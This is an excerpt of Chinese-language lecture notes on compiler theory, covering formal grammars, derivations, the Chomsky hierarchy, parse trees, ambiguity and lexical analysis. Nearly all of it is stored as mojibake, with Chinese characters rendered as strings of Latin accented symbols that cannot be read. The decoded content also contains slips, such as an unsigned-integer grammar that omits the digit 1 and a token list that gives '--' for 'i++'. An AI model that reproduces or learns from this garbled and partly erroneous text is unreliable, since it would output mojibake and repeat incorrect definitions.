\u003eçš„ç¬¦å·éƒ½ç”±ç»ˆç»“ç¬¦å·æ›¿ä»£ä¸ºæ­¢ã€‚\n è¯´æ˜ï¼šæœ‰è‹¥å¹²è¯­æ³•æˆåˆ†åŒæ—¶å­˜åœ¨æ—¶ï¼Œæˆ‘ä»¬æ€»æ˜¯ä»æœ€å·¦çš„è¯­æ³•æˆåˆ†è¿›è¡Œæ¨å¯¼ï¼Œè¿™ç§°ä¹‹ä¸ºæœ€å·¦æ¨å¯¼ï¼Œç±»ä¼¼çš„æœ‰æœ€å³æ¨å¯¼ï¼ˆä¸€èˆ¬æ¨å¯¼ï¼‰ã€‚\n æ–‡æ³•å®åœ¨å½¢å¼ä¸Šå¯¹å¥å­ç»“æ„çš„å®šä¹‰ä¸æè¿°ï¼Œè€Œæœªæ¶‰åŠè¯­ä¹‰é—®é¢˜\n4.è¯­æ³•æ ‘\nä¸€èˆ¬ç”¨è¯­æ³•æ ‘æ¥æè¿°ä¸€ä¸ªå¥å­çš„è¯­æ³•ç»“æ„ã€‚\nå››ã€æ–‡æ³•å’Œè¯­è¨€çš„å½¢å¼å®šä¹‰ 1.æ–‡æ³•çš„å®šä¹‰ å®šä¹‰1: æ–‡æ³• G =ï¼ˆVNï¼ŒVTï¼ŒPï¼ŒZï¼‰\nâ€‹\tVN ï¼š\téç»ˆç»“ç¬¦å·é›† â€‹\tVT ï¼š\tç»ˆç»“ç¬¦å·é›† â€‹\tPï¼š\täº§ç”Ÿå¼æˆ–è§„åˆ™çš„é›†åˆ â€‹\tZï¼š\tå¼€å§‹ç¬¦å·ï¼ˆè¯†åˆ«ç¬¦å·ï¼‰ ZâˆˆVN\n  äº§ç”Ÿå¼ï¼šäº§ç”Ÿå¼æ˜¯ä¸€ä¸ªæœ‰åºå¯¹(U, x), é€šå¸¸å†™ä¸º:  â€‹ U ::= x æˆ–U â¡ xï¼› |U| = 1 |x| \u003e= 0\n  éç»ˆç»“ç¬¦å·ï¼šå‡ºç°åœ¨äº§ç”Ÿå¼çš„å·¦éƒ¨,ä¸”èƒ½æ¨å‡ºç¬¦å·æˆ–ç¬¦å·ä¸²çš„é‚£äº›ç¬¦å·ã€‚å…¶å…¨ä½“æ„æˆéç»ˆç»“ç¬¦å·é›†ï¼Œè®°ä¸ºVN\n  ç»ˆç»“ç¬¦å·ï¼šä¸å‡ºç°åœ¨äº§ç”Ÿå¼çš„å·¦éƒ¨,ä¸”ä¸èƒ½æ¨å‡ºç¬¦å·æˆ–ç¬¦å·ä¸²çš„é‚£äº›ç¬¦å·ã€‚å…¶å…¨ä½“æ„æˆç»ˆç»“ç¬¦å·é›†ï¼Œè®°ä¸ºVT\n   æ— ç¬¦å·æ•´æ•°çš„æ–‡æ³•: G[\u003cæ— ç¬¦å·æ•´æ•°\u003e]=ï¼ˆVNï¼ŒVTï¼ŒPï¼ŒZï¼‰ VNï¼{\u003cæ— ç¬¦å·æ•´æ•°\u003e, \u003cæ•°å­—ä¸²\u003e, \u003cæ•°å­—\u003e} VT = {0,1,2,3,4,5,6,7,8,9} P = {\u003cæ— ç¬¦å·æ•´æ•°\u003e â†’ \u003cæ•°å­—ä¸²\u003e ; \u003cæ•°å­—ä¸²\u003e â†’ \u003cæ•°å­—ä¸²\u003e \u003cæ•°å­—\u003e ; \u003cæ•°å­—ä¸²\u003e â†’ \u003cæ•°å­—\u003e ; \u003cæ•°å­—\u003e â†’0; \u003cæ•°å­—\u003e â†’2; \u003cæ•°å­—\u003e â†’3;\t\u003cæ•°å­—\u003e â†’4;\t\u003cæ•°å­—\u003e â†’5; \u003cæ•°å­—\u003e â†’6;\t\u003cæ•°å­—\u003e â†’7;\t\u003cæ•°å­—\u003e â†’8; \u003cæ•°å­—\u003e â†’9; } Z = \u003cæ— ç¬¦å·æ•´æ•°\u003e; æ³¨ï¼šäº§ç”Ÿå¼å·¦è¾¹ç¬¦åˆæ„æˆé›†åˆVNï¼Œä¸”Z âˆˆ VN\nâ€‹\tæœ‰äº›äº§ç”Ÿå¼æœ‰ç›¸åŒçš„å·¦éƒ¨ï¼Œå¯ä»¥åˆåœ¨ä¸€èµ·\nâ€‹\tç»™å®šä¸€ä¸ªæ–‡æ³•ï¼Œå®é™…ä¸Šåªéœ€ç»™å‡ºäº§ç”Ÿå¼çš„é›†åˆï¼Œå¹¶æŒ‡å®šè¯†åˆ«ç¬¦å·ï¼ˆå¼€å§‹ç¬¦å·ï¼‰\n2.æ¨å¯¼ä¸å½’çº¦ **å®šä¹‰2ï¼š**ç›´æ¥æ¨å¯¼ï¼š\næœ‰æ–‡æ³•Gï¼šv = xUyï¼Œw = xuyï¼Œå…¶ä¸­xã€yâˆˆV*ï¼ŒUâˆˆVNï¼ŒuâˆˆV*ï¼Œ\nè‹¥U ::= uâˆˆPï¼Œåˆ™v â‡’ wï¼Œ\nè‹¥ x = y = Îµ ï¼Œ æœ‰ U ::= uï¼Œ åˆ™U â‡’ u\nxå’Œyæ˜¯ç¬¦å·ä¸²ï¼Œè‹¥ä½¿ç”¨ä¸€æ¬¡äº§ç”Ÿå¼å¯ä»¥ä»xå˜æ¢å‡ºyï¼Œåˆ™ç§°xç›´æ¥æ¨å¯¼å‡ºy(æˆ–è€…è¯´yæ˜¯xçš„ç›´æ¥æ¨å¯¼ï¼‰ï¼Œè®°ä¸ºxâ‡’yã€‚\nå®šä¹‰3ï¼š +æ¨å¯¼ï¼šxå’Œyæ˜¯ç¬¦å·ä¸²ï¼Œè‹¥ä½¿ç”¨è‹¥å¹²æ¬¡äº§ç”Ÿå¼å¯ä»¥ä»xå˜æ¢å‡ºyï¼Œåˆ™ç§°xæ¨å¯¼å‡ºy(æˆ–è€…è¯´yæ˜¯xçš„æ¨å¯¼ï¼‰ï¼Œè®°ä¸ºx =+=â‡’yã€‚\nå³ï¼Œè‹¥æœ‰ç›´æ¥æ¨å¯¼åºåˆ—ï¼šx=U0==\u003eU1==\u003eU2==\u003eâ€¦â€¦==\u003eUn=y,åˆ™ x=+=\u003ey ã€‚\nå®šä¹‰4ï¼š*æ¨å¯¼ï¼šxå’Œyæ˜¯ç¬¦å·ä¸²ï¼Œè‹¥ä½¿ç”¨0æ¬¡æˆ–è‹¥å¹²æ¬¡äº§ç”Ÿå¼å¯ä»¥ä»xå˜æ¢å‡ºyï¼Œåˆ™ç§°xæ¨å¯¼å‡ºy(æˆ–è€…è¯´yæ˜¯xçš„æ¨å¯¼ï¼‰ï¼Œè®°ä¸ºx=*=\u003eyã€‚\nå¦‚ï¼šN=*=\u003eNï¼Œ N=*=\u003e109\n**å®šä¹‰5ï¼š**æœ€å³æ¨å¯¼\u0026æœ€å·¦æ¨å¯¼\n  æœ€å³æ¨å¯¼ï¼šè‹¥ç¬¦å·ä¸²Î±ä¸­æœ‰ä¸¤ä¸ªä»¥ä¸Šçš„éç»ˆç»“ç¬¦æ—¶ï¼Œå¯¹æ¨å¯¼çš„æ¯ä¸€æ­¥åšæŒæŠŠÎ±ä¸­çš„æœ€å³éç»ˆç»“ç¬¦è¿›è¡Œæ›¿æ¢ï¼Œç§°ä¸ºæœ€å³æ¨å¯¼ã€‚\n  æœ€å·¦æ¨å¯¼ï¼šè‹¥ç¬¦å·ä¸²Î±ä¸­æœ‰ä¸¤ä¸ªä»¥ä¸Šçš„éç»ˆç»“ç¬¦æ—¶ï¼Œå¯¹æ¨å¯¼çš„æ¯ä¸€æ­¥åšæŒæŠŠÎ±ä¸­çš„æœ€å·¦éç»ˆç»“ç¬¦è¿›è¡Œæ›¿æ¢ï¼Œç§°ä¸ºæœ€å·¦æ¨å¯¼ã€‚\n  ï¼ï¼ï¼è§„èŒƒæ¨å¯¼ï¼æœ€å³æ¨å¯¼\n**å®šä¹‰6ï¼š**æ¨å¯¼çš„é€†è¿‡ç¨‹ä¸ºå½’çº¦\nx==\u003eyï¼Œå¯ç§°ä¸ºxç›´æ¥æ¨å¯¼å‡ºyï¼Œä¹Ÿå¯ç§°ä¸ºyç›´æ¥å½’çº¦å‡ºx\n3.è¯­è¨€çš„å½¢å¼å®šä¹‰ **å®šä¹‰7ï¼š**æ–‡æ³•G[Z]\nâ€‹\tï¼ˆ1ï¼‰å¥å‹ï¼šxæ˜¯å¥å‹ â‡” Z =*=\u003ex,ä¸” xâˆˆV*ï¼›\nâ€‹\tï¼ˆ2ï¼‰å¥å­ï¼šxæ˜¯å¥å­ â‡” Z =+=\u003e x, ä¸” xâˆˆVT*ï¼›\nâ€‹\tï¼ˆ3ï¼‰è¯­è¨€ï¼šLï¼ˆG[Z]ï¼‰={x| Z=+=\u003exï¼Œ xâˆˆVT* }ï¼›ï¼ˆæ–‡æ³•G[z]äº§ç”Ÿçš„æ‰€æœ‰å¥å­çš„é›†åˆï¼‰\nå®šä¹‰8ï¼šGå’ŒG'æ˜¯ä¸¤ä¸ªä¸åŒçš„æ–‡æ³•ï¼Œè‹¥L(G) = L(G')ï¼Œåˆ™Gå’ŒG'ä¸ºç­‰ä»·æ–‡æ³•\nç¼–è¯‘æ„Ÿå…´è¶£çš„é—®é¢˜å¦‚ä¸‹\nç»™å®šç»ˆæç¬¦xï¼Œæ–‡æ³•Gï¼Œæ±‚x âˆˆ L(G)ï¼Ÿ\n4.æ–‡æ³•åˆ†ç±»\n å½¢å¼è¯­è¨€ï¼šç”¨æ–‡æ³•å’Œè‡ªåŠ¨æœºæ‰€æè¿°çš„æ²¡æœ‰è¯­ä¹‰çš„è¯­è¨€  è¯­è¨€å®šä¹‰ï¼š L(G[Z]) = { x | Z=+=\u003exï¼ŒxâˆˆVT* }\næ–‡æ³•å®šä¹‰ï¼šä¹”å§†æ–¯åŸºå°†æ‰€æœ‰æ–‡æ³•å®šä¹‰ä¸ºä¸€ä¸ªå››å…ƒç»„ï¼šG = ï¼ˆVNï¼ŒVTï¼ŒPï¼ŒZï¼‰\n VN ï¼š\téç»ˆç»“ç¬¦å·é›† VT ï¼š\tç»ˆç»“ç¬¦å·é›† Pï¼š\täº§ç”Ÿå¼æˆ–è§„åˆ™çš„é›†åˆ Zï¼š\tå¼€å§‹ç¬¦å·ï¼ˆè¯†åˆ«ç¬¦å·ï¼‰ ZâˆˆVN\n æ–‡æ³•å’Œè¯­è¨€çš„åˆ†ç±»ï¼š0å‹ã€1å‹ã€2å‹ã€3å‹\nå®šä¹‰9ï¼š 0å‹æ–‡æ³•\n Pï¼š u â†’ v ï¼Œå…¶ä¸­ u âˆˆ V+ï¼Œv âˆˆ V*\n0å‹æ–‡æ³•ç§°ä¸ºçŸ­è¯­ç»“æ„æ–‡æ³•ã€‚äº§ç”Ÿå¼çš„å·¦éƒ¨å’Œå³éƒ¨éƒ½å¯ä»¥æ˜¯ç¬¦å·ä¸²ï¼Œä¸€ä¸ªçŸ­è¯­å¯ä»¥äº§ç”Ÿå¦ä¸€ä¸ªçŸ­è¯­ã€‚\n0å‹è¯­è¨€ï¼šL0ï¼Œè¿™ç§è¯­è¨€å¯ä»¥ç”¨**å›¾çµæœºï¼ˆTuringï¼‰**æ¥å—\n **å®šä¹‰10ï¼š**1å‹æ–‡æ³•\n Pï¼š xUy â†’ xuy ï¼Œå…¶ä¸­ U âˆˆVNï¼Œxã€yã€u âˆˆ V*\n1å‹æ–‡æ³•ç§°ä¸ºä¸Šä¸‹æ–‡æœ‰å…³æˆ–ä¸Šä¸‹æ–‡æ•æ„Ÿã€‚å³åªæœ‰åœ¨xã€yè¿™æ ·çš„ä¸Šä¸‹æ–‡ä¸­æ‰èƒ½å°†Uæ”¹å†™ä¸ºu\n1å‹è¯­è¨€ï¼šL1ï¼Œè¿™ç§è¯­è¨€å¯ä»¥æœ‰ä¸€ç§çº¿æ€§ç•Œé™è‡ªåŠ¨æœºæ¥å—\n **å®šä¹‰11ï¼š**2å‹æ–‡æ³•\n Pï¼š U â†’ u ï¼Œå…¶ä¸­ U âˆˆ VN ï¼Œu âˆˆ V*\n2å‹æ–‡æ³•ç§°ä¸ºä¸Šä¸‹æ–‡æ— å…³æ–‡æ³•ã€‚å³æŠŠUæ”¹å†™ä¸ºuæ—¶ï¼Œä¸å¿…è€ƒè™‘ä¸Šä¸‹æ–‡ã€‚\næ³¨æ„ï¼š2å‹æ–‡æ³•ä¸BNFè¡¨ç¤ºç›¸ç­‰ä»·ã€‚\n2å‹è¯­è¨€ï¼šL2ï¼Œè¿™ç§è¯­è¨€å¯ä»¥ç”±ä¸‹æ¨è‡ªåŠ¨æœºæ¥å—\n **å®šä¹‰12ï¼š**3å‹æ–‡æ³•\n ï¼ˆå·¦çº¿å‹ï¼‰ Pï¼š U â†’ T | U â†’ wT ï¼Œå…¶ä¸­ Uã€w âˆˆ VN ï¼ŒT âˆˆ VT\nï¼ˆå³çº¿æ€§ï¼‰Pï¼š U â†’ T | U â†’ Tw ï¼Œå…¶ä¸­ Uã€w âˆˆ VN ï¼ŒT âˆˆ VT\n3å‹æ–‡æ³•ç§°ä¸ºæ­£åˆ™æ–‡æ³•ã€‚å®ƒæ˜¯å¯¹2å‹æ–‡æ³•è¿›è¡Œè¿›ä¸€æ­¥çš„é™åˆ¶\n3å‹è¯­è¨€ï¼šL3ï¼Œåˆç§°æ­£åˆ™è¯­è¨€ã€æ­£åˆ™é›†åˆï¼Œè¿™ç§è¯­è¨€å¯ä»¥ç”±æœ‰ç©·è‡ªåŠ¨æœºæ¥å—\n ç”±ä¸Šæ˜“çŸ¥ï¼Œ L0 âŠƒ L1 âŠƒ L2 âŠƒ L3\n0å‹æ–‡æ³•å¯ä»¥äº§ç”ŸL0ã€L1ã€L2ã€L3ï¼Œä½†2å‹æ–‡æ³•åªèƒ½äº§ç”ŸL2ï¼Œä¸èƒ½äº§ç”ŸL1\n5.è¯­æ³•æ ‘ä¸äºŒä¹‰æ€§æ–‡æ³• 1.æ¨å¯¼ä¸è¯­æ³•æ ‘\nè¯­æ³•æ ‘ï¼šå¥å­ç»“æ„çš„å›¾ç¤ºè¡¨ç¤ºæ³•ï¼Œé€šå¸¸è¡¨ç¤ºç§°ä¸€æ£µå€’ç«‹çš„æ ‘ï¼Œå³\n ç»“ç‚¹ï¼š\tç¬¦å·\næ ¹èŠ‚ç‚¹ï¼š\tè¯†åˆ«ç¬¦å·\nä¸­é—´èŠ‚ç‚¹ï¼šéç»ˆç»“ç¬¦\nå¶èŠ‚ç‚¹ï¼š\tç»ˆç»“ç¬¦æˆ–éç»ˆç»“ç¬¦\nè¾¹ï¼šè¡¨ç¤ºèŠ‚ç‚¹é—´çš„æ´¾ç”Ÿå…³ç³»\n å¥å‹çš„æ¨å¯¼åŠè¯­æ³•æ ‘çš„ç”Ÿæˆï¼ˆè‡ªé¡¶å‘ä¸‹ï¼‰\nç»™å®šG[Z]ï¼Œå¥å‹wï¼šå¯å»ºç«‹æ¨å¯¼åºåˆ—ï¼ŒZ =*=\u003e wï¼›å¯å»ºç«‹è¯­æ³•æ ‘ï¼Œä»¥Zä¸ºæ ‘æ ¹èŠ‚ç‚¹ï¼Œæ¯æ­¥æ¨å¯¼ç”Ÿæˆè¯­æ³•æ ‘çš„ä¸€æï¼Œæœ€ç»ˆå¯ç”Ÿæˆå¥å‹çš„è¯­æ³•æ ‘ã€‚\nè¯­æ³•æ ‘çš„ç”Ÿæˆè§„å¾‹ä¸åŒï¼Œä½†æœ€ç»ˆç”Ÿæˆçš„è¯­æ³•æ ‘å½¢çŠ¶å®Œå…¨ç›¸åŒ\nä¸€èˆ¬æ¨å¯¼\ngraph TB A[\u003cæ— ç¬¦å·æ•´æ•°\u003e] --\u003e B[\u003cæ•°å­—ä¸²\u003e] B --\u003e C[\u003cæ•°å­—ä¸²\u003e] B --\u003e D[\u003cæ•°å­—\u003e] C --\u003e E[\u003cæ•°å­—\u003e] E --\u003e F[1] D --\u003e G[0] æ ‘ä¸æ¨å¯¼ï¼šå¥å‹æ¨å¯¼è¿‡ç¨‹ â‡” å¥å‹è¯­æ³•æ ‘çš„ç”Ÿé•¿è¿‡ç¨‹\nâ‘ ç”±æ¨å¯¼æ„é€ è¯­æ³•æ ‘\nä»è¯†åˆ«ç¬¦å·å¼€å§‹ï¼Œè‡ªå·¦å‘å³å»ºç«‹æ¨å¯¼åºåˆ— â‡’ ç”±æ ¹èŠ‚ç‚¹å¼€å§‹ï¼Œè‡ªä¸Šè€Œä¸‹å»ºç«‹è¯­æ³•æ ‘\nâ‘¡ç”±è¯­æ³•æ ‘æ„é€ æ¨å¯¼\nè‡ªå¶è€Œæ ¹ä¿®å‰ªå­æ ‘çš„æœ«ç«¯èŠ‚ç‚¹ï¼Œç›´è‡³æŠŠæ•´æ£µæ ‘å‰ªæ‰ï¼ˆç•™æ ¹ï¼‰ï¼Œæ¯å‰ªä¸€æ¬¡å¯¹åº”ä¸€æ¬¡å½’çº¦ â‡’ ä»å¥å‹å¼€å§‹ï¼Œè‡ªå³å‘å·¦åœ°é€æ­¥è¿›è¡Œå½’çº¦ï¼Œå»ºç«‹æ¨å¯¼åºåˆ—\n2.æ–‡æ³•çš„äºŒä¹‰æ€§\nå®šä¹‰ï¼šè‹¥å¯¹äºä¸€ä¸ªæ–‡æ³•çš„æŸä¸€å¥å­å­˜åœ¨ä¸¤æ£µä¸åŒçš„è¯­æ³•æ ‘ï¼Œåˆ™è¯¥æ–‡æ³•æ˜¯äºŒä¹‰æ€§æ–‡æ³•ï¼Œå¦åˆ™æ˜¯æ— äºŒä¹‰æ€§æ–‡æ³•\næ¢è€Œè¨€ä¹‹ï¼Œæ— äºŒä¹‰æ€§æ–‡æ³•çš„å¥å­åªæœ‰ä¸€æ£µè¯­æ³•æ ‘ï¼Œå°½ç®¡æ¨å¯¼è¿‡ç¨‹å¯ä»¥ä¸åŒ\næ¯”å¦‚äºŒä¹‰æ€§æ–‡æ³•: G[E]:\tE := E+E | E*E | (E) | i Vn = {E} VT = {+,*,(,),i} é’ˆå¯¹ i+i*i æœ‰ä¸¤ç§ä¸åŒçš„è¯­æ³•æ ‘ å®šä¹‰ï¼šè‹¥ä¸€ä¸ªæ–‡æ³•çš„æŸå¥å­å­˜åœ¨ä¸¤ä¸ªä¸åŒçš„è§„èŒƒæ¨å¯¼ï¼ˆæœ€å³æ¨å¯¼ï¼‰ï¼Œåˆ™è¯¥æ–‡æ³•æ˜¯äºŒä¹‰æ€§çš„ï¼Œå¦åˆ™æ˜¯æ— äºŒä¹‰æ€§çš„\n è‹¥æ–‡æ³•æ˜¯äºŒä¹‰æ€§çš„ï¼Œåˆ™åœ¨ç¼–è¯‘æ—¶å°±ä¼šäº§ç”Ÿä¸ç¡®å®šæ€§ï¼Œé—æ†¾çš„æ˜¯åœ¨ç†è®ºä¸Šå·²ç»è¯æ˜ï¼šæ–‡æ³•çš„äºŒä¹‰æ€§æ˜¯ä¸å¯åˆ¤å®šçš„ï¼Œå³ä¸å¯èƒ½æ„é€ å‡ºä¸€ä¸ªç®—æ³•ï¼Œé€šè¿‡æœ‰é™æ­¥éª¤æ¥åˆ¤å®šä»»ä¸€æ–‡æ³•æ˜¯å¦æœ‰äºŒä¹‰æ€§\nç°åœ¨çš„è§£å†³åŠæ³•æ˜¯ï¼šæå‡ºä¸€äº›é™åˆ¶æ¡ä»¶ï¼Œç§°ä¸ºæ— äºŒä¹‰æ€§çš„å……åˆ†æ¡ä»¶ï¼Œå½“æ–‡æ³•æ»¡è¶³è¿™äº›æ¡ä»¶æ—¶ï¼Œå°±å¯ä»¥åˆ¤å®šæ–‡æ³•æ˜¯æ— äºŒä¹‰æ€§çš„ã€‚\nç”±äºæ— äºŒä¹‰æ€§æ–‡æ³•æ¯”è¾ƒç®€å•ï¼Œæˆ‘ä»¬ä¹Ÿå¯ä»¥é‡‡ç”¨å¦ä¸€ç§è§£å†³åŠæ³•ï¼šå³ä¸æ”¹å˜äºŒä¹‰æ€§æ–‡æ³•ï¼Œè€Œæ˜¯ç¡®å®šä¸€ç§ç¼–è¯‘ç®—æ³•ï¼Œä½¿è¯¥ç®—æ³•æ»¡è¶³æ— äºŒä¹‰æ€§å……åˆ†æ¡ä»¶ã€‚\n å¥æŸ„ï¼šå¥å‹çš„å¥æŸ„æ˜¯å’ŒæŸäº§ç”Ÿå¼å³éƒ¨åŒ¹é…çš„å­ä¸²ã€‚å¥æŸ„æ˜¯ç›´æ¥çŸ­è¯­ï¼Œå³æŸäº§ç”Ÿå¼çš„å³éƒ¨ï¼Œå…·æœ‰æœ€å·¦æ€§\nè‹¥å¥æŸ„ä¸å­˜åœ¨é‡å¤ï¼Œå°±è¯´æ˜æ–‡æ³•æ— äºŒä¹‰æ€§\nå¦‚ S â†’ ABC ï¼ŒABCä¸ºè¯¥å¥å­çš„å¥æŸ„\nä¸‰ã€è¯æ³•åˆ†æ  è¯æ³•åˆ†æ ï¼ˆLexical Analysisï¼‰  å®ç°è¯æ³•åˆ†æå™¨çš„ç¨‹åºç§°ä¸ºè¯æ³•åˆ†æç¨‹åºï¼ˆæ‰«æå™¨ï¼‰\nè¯æ³•åˆ†æç¨‹åºçš„ä¸»è¦ä»»åŠ¡ï¼šå¯¹æ„æˆæºç¨‹åºçš„å­—ç¬¦ä¸²ä»å·¦åˆ°å³çš„æ‰«æï¼Œé€ä¸ªå­—ç¬¦åœ°è¯»å…¥æºç¨‹åºå­—ç¬¦å¹¶æŒ‰ç…§æ„è¯è§„åˆ™åˆ‡åˆ†æˆä¸€ä¸ªä¸€ä¸ªå…·æœ‰ç‹¬ç«‹æ„ä¹‰çš„å•è¯ã€‚å¹¶ç¡®å®šå…¶å±æ€§ï¼ˆå¦‚ä¿ç•™å­—ã€æ ‡è¯†ç¬¦ã€è¿ç®—ç¬¦ã€ç•Œé™ç¬¦å’Œå¸¸é‡ç­‰ï¼‰ã€‚å†æŠŠå®ƒä»¬è½¬æ¢æˆé•¿åº¦ç»Ÿä¸€çš„æ ‡å‡†å½¢å¼â€”â€”å±æ€§å­—ï¼ˆTOKENï¼‰ã€‚\nè¯æ³•åˆ†ææ˜¯ç¼–è¯‘è¿‡ç¨‹ä¸­çš„ç¬¬ä¸€ä¸ªé˜¶æ®µï¼Œåœ¨è¯­æ³•åˆ†æå‰è¿›è¡Œã€‚ä¹Ÿå¯ä»¥å’Œè¯­æ³•åˆ†æç»“åˆåœ¨ä¸€èµ·ä½œä¸ºä¸€éï¼Œç”±è¯­æ³•åˆ†æç¨‹åºè°ƒç”¨è¯æ³•åˆ†æç¨‹åºæ¥è·å¾—å½“å‰å•è¯ä¾›è¯­æ³•åˆ†æä½¿ç”¨ã€‚\ngraph LR A[æºç¨‹åº] --\u003e B[è¯æ³•åˆ†æç¨‹åº] B -- Token --\u003e C[è¯­æ³•åˆ†æç¨‹åº] C -- get token --\u003e B  ä¸ºä»€ä¹ˆå°†è¯æ³•åˆ†æå·¥ä½œä»è¯­æ³•åˆ†æå·¥ä½œä¸­ç‹¬ç«‹å‡ºæ¥ï¼Ÿ\n  ç®€åŒ–è®¾è®¡\n  æ”¹è¿›ç¼–è¯‘æ•ˆç‡\n  å¢åŠ ç¼–è¯‘ç³»ç»Ÿçš„å¯ç§»æ¤æ€§\n   3.1 è¯æ³•åˆ†æå™¨çš„è¦æ±‚  åŠŸèƒ½ï¼šè¾“å…¥æºç¨‹åºï¼Œè¾“å‡ºå•è¯ç¬¦å·  å•è¯ç¬¦å·æ˜¯ä¸€ä¸ªç¨‹åºè¯­è¨€çš„åŸºæœ¬è¯­æ³•ç¬¦å·\n å•è¯çš„åˆ†ç±»ï¼š   1.**å…³é”®å­—ï¼š**ç”±ç¨‹åºè¯­è¨€å®šä¹‰çš„å…·æœ‰å›ºå®šæ„ä¹‰çš„æ ‡è¯†ç¬¦ã€‚ä¹Ÿç§°ä¸ºä¿ç•™å­—æˆ–åŸºæœ¬å­—\n2.**æ ‡è¯†ç¬¦ï¼š**ç”¨æ¥è¡¨ç¤ºç¨‹åºä¸­å„ç§åå­—çš„å­—ç¬¦ä¸²ã€‚\n3.**å¸¸ æ•°ï¼š**å¸¸æ•°çš„ç±»å‹ä¸€èˆ¬æœ‰æ•´å‹ã€å®å‹ã€å¸ƒå°”å‹ã€æ–‡å­—å‹ã€‚\n4.**è¿ç®—ç¬¦ï¼š**å¦‚+ã€ï¼ ã€*ã€/ ç­‰ã€‚\n5.**ç•Œé™ç¬¦ï¼š**å¦‚é€—å·ã€åˆ†å·ã€æ‹¬å·ç­‰ã€‚\n ä¸€ä¸ªç¨‹åºè¯­è¨€çš„å…³é”®å­—ã€è¿ç®—ç¬¦ã€ç•Œé™ç¬¦éƒ½æ˜¯å›ºå®šçš„ï¼Œå³æ•°é‡æœ‰é™åŠæ„ä¹‰æ˜ç¡®ï¼›è€Œå¯¹äºæ ‡è¯†ç¬¦å’Œå¸¸æ•°é€šå¸¸æ˜¯ä¸ç¡®å®šçš„ã€‚\nè¯æ³•åˆ†æå™¨æ‰€è¾“å‡ºçš„å•è¯ç¬¦å·å¸¸å¸¸è¡¨ç¤ºä¸ºäºŒå…ƒå¼ï¼šï¼ˆå•è¯ç§åˆ«ï¼Œå•è¯ç¬¦å·çš„å±æ€§å€¼ï¼‰\nå•è¯ç§åˆ«ä¸€èˆ¬å°†â‘ æ ‡è¯†ç¬¦å½’ä¸ºä¸€ç§ï¼Œâ‘¡å¸¸æ•°æŒ‰ç±»å‹åˆ†ç§ï¼ˆæ•´æ•°å®æ•°å¸ƒå°”ï¼‰ï¼Œâ‘¢å…³é”®å­—å…¨ä½“è§†ä¸ºä¸€ç§ï¼Œæˆ–è€…ä¸€ä¸ªä¸€ç§ï¼Œâ‘£è¿ç®—ç¬¦å¯é‡‡ç”¨ä¸€ç¬¦ä¸€ç§ï¼Œâ‘¤ç•Œç¬¦ä¸€èˆ¬ä¹Ÿç”¨ä¸€ç¬¦ä¸€ç§ã€‚\nå¦‚æœä¸€ä¸ªç§åˆ«åªå«ä¸€ä¸ªå•è¯ç¬¦å·ï¼Œé‚£ä¹ˆå¯¹äºè¿™ä¸ªå•è¯ç¬¦å·ï¼Œç§åˆ«ç¼–ç å¯å®Œå…¨ä»£è¡¨å…¶è‡ªèº«ã€‚è‹¥ä¸€ä¸ªç§åˆ«æœ‰å¤šä¸ªå•è¯ç¬¦å·ï¼Œé‚£ä¹ˆï¼Œå¯¹äºæ¯ä¸ªå•è¯ç¬¦å·ï¼Œé™¤äº†ç»™å‡ºç§åˆ«ç¼–ç å¤–ï¼Œè¿˜åº”ç»™å‡ºæœ‰å…³çš„å•è¯ç¬¦å·çš„å±æ€§ä¿¡æ¯ã€‚\nå•è¯ç¬¦å·çš„å±æ€§æ˜¯æŒ‡å•è¯ç¬¦å·çš„ç‰¹æ€§æˆ–ç‰¹å¾ã€‚å±æ€§å€¼æ˜¯ååº”ç‰¹æ€§æˆ–ç‰¹å¾çš„å€¼ã€‚\n1 2 3 4 5 6 7 8 9 10 11  while(i\u003e=j)i++;//ä»¥è¯¥è¯­å¥ä¸ºç¤ºä¾‹ //è¯¥å¥çš„å•è¯ç¬¦å·åºåˆ—å¦‚ä¸‹: \u003cwhile, -\u003e \u003c(, -\u003e \u003cid, point(i)\u003e//å­˜æ”¾æŒ‡å‘içš„æŒ‡é’ˆ \u003c\u003e=, -\u003e \u003cid, point(j)\u003e//å­˜æ”¾æŒ‡å‘jçš„æŒ‡é’ˆ \u003c), -\u003e \u003cid, point(i)\u003e \u003c--, -\u003e \u003c;, -\u003e   3.2 è¯æ³•åˆ†æå™¨çš„è®¾è®¡ â… ã€è¾“å…¥ã€é¢„å¤„ç† è¯æ³•åˆ†æå™¨å·¥ä½œçš„ç¬¬ä¸€æ­¥æ˜¯è¾“å…¥æºç¨‹åºæ–‡æœ¬ã€‚è¾“å…¥ä¸²ä¸€èˆ¬æ˜¯æ”¾åœ¨ä¸€ä¸ªç¼“å†²åŒºä¸­ï¼Œè¿™ä¸ªç¼“å†²åŒºç§°è¾“å…¥ç¼“å†²åŒºã€‚è¯æ³•åˆ†æçš„å·¥ä½œï¼ˆå•è¯ç¬¦å·çš„è¯†åˆ«ï¼‰å¯ä»¥ç›´æ¥åœ¨è¿™ä¸ªç¼“å†²åŒºä¸­è¿›è¡Œã€‚ä½†åœ¨è®¸å¤šæƒ…å†µä¸‹ï¼ŒæŠŠè¾“å…¥ä¸²é¢„å¤„ç†ä¸€ä¸‹ï¼Œå¯¹å•è¯ç¬¦å·çš„è¯†åˆ«å·¥ä½œå°†æ˜¯æ¯”è¾ƒæ–¹ä¾¿çš„ã€‚\né¢„å¤„ç†çš„ä¸»è¦å·¥ä½œ  æŸäº›è·³æ ¼ç¬¦ã€å›è½¦ç¬¦å’Œæ¢è¡Œç¬¦ç­‰ç¼–è¾‘æ€§å­—ç¬¦ï¼Œåœ¨åˆ«å¤„çš„ä»»ä½•å‡ºç°éƒ½æ²¡æœ‰æ„ä¹‰ï¼Œé¢„å¤„ç†æ—¶å¯ä»¥å°†å…¶å‰”æ‰ æ³¨è§£éƒ¨åˆ†â€”â€”ä»…åœ¨äºæ”¹å–„ç¨‹åºçš„æ˜“è¯»æ€§å’Œæ˜“ç†è§£æ€§ã€‚å¯¹äºå®ƒä»¬ï¼Œé¢„å¤„ç†æ—¶å¯ä»¥å°†å…¶å‰”æ‰ ç©ºç™½ç¬¦ï¼ˆä¸€ä¸ªæˆ–ç›¸ç»§æ•°ä¸ªï¼‰ç”¨ä½œå•è¯ç¬¦å·ä¹‹é—´çš„é—´éš”ï¼Œå³ç”¨ä½œç•Œç¬¦ã€‚åœ¨è¿™ç§æƒ…å†µä¸‹ï¼Œé¢„å¤„ç†æ—¶å¯æŠŠç›¸ç»§çš„è‹¥å¹²ä¸ªç©ºç™½ç»“åˆæˆä¸€ä¸ªã€‚  